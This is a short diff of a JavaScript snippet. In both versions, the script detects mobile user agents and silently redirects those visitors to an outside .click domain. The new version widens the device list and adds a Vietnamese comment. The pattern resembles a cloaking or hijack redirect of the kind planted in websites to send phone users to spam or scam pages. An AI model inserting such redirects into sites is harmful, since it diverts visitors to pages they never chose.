@@ -1,5 +1,5 @@
-const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-if (isMobile) {
-    window.location.replace("https://maohoankhangchinhhang.click/moctoc");
-      };
+if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
+  // thiết bị là điện thoại
+  window.location.replace("https://maohoankhangchinhhang.click/moctoc");
 
+} 
